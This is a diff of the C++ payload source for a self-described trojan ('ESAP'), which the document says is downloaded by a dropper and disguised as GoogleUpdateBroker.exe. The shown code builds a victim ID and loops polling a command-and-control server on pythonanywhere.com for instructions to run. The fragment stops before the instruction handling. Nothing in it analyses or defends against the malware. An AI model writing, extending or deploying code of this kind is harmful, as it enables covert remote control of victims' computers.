@@ -1,3 +1,15 @@
+/*
+ ___ ___   _   ___ 
+| __/ __| /_\ | _ \
+| _|\__ \/ _ \|  _/
+|___|___/_/ \_\_|  
+
+ESAP: The Extremely Sophisticated And Potent Trojan
+<_payload.cpp>
+This is the main payload that is downloaded by ESAP.exe and disguised as GoogleUpdateBroker.exe
+
+*/
+
 #include <iostream>
 #include <winsock2.h>
 #include <windows.h>
@@ -17,11 +29,13 @@
 
 using json = nlohmann::json;
 
+bool ALIVE = true;
+
 int main() {
     std::cout << "up and running\n";
     std::string id = GetID();
     std::unordered_set<std::string> seenInstructions;
-    while (true) {
+    while (ALIVE) {
         for (std::string ins: SplitString(GET_Request("http://0x3af72.pythonanywhere.com/instructions/?u=" + id), INSTRUCTION_SEP_TOKEN)) {
             if (!ins.size()) continue;
             std::vector<std::string> values = SplitString(ins, INSTRUCTION_VAL_SEP_TOKEN);
